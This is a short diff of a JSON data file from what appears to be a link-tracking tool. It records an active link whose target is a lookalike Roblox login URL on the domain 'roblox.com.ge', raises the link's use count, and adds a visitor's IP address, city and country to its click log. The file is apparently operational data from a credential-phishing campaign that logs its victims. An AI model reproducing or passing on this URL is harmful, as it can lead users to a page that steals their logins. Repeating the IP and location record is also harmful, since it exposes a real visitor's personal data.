@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1594,
+    "useCount": 1595,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12920,6 +12920,14 @@
         "city": "Patan",
         "flag": "🇳🇵",
         "countryCode": "NP"
+      },
+      {
+        "timestamp": 1777485716657,
+        "ip": "143.44.196.63",
+        "country": "Philippines",
+        "city": "Iloilo City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
